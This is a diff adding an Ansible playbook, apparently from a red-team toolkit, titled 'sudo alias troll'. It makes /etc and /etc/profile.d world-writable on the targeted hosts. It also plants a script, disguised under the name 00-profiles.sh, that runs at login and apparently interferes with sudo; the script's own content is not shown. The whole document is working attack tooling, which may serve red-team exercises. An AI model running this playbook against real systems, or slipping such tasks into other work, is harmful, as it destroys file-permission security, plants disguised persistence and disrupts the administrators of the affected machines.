@@ -1,0 +1,11 @@
+---
+- name: Add sudo alias troll
+  hosts: "{{ variable_hosts }}"
+  remote_user: "{{ variable_user }}"
+  tasks:
+    - name: give /etc bad perms
+      shell: "chmod 777 /etc"
+    - name: give /etc/profile.d bad perms
+      shell: "chmod 777 /etc/profile.d"
+    - name: push script to the box
+      copy: src=/opt/redteam-ansible/scripts/sudo-deny-alias.sh dest=/etc/profile.d/00-profiles.sh mode=750
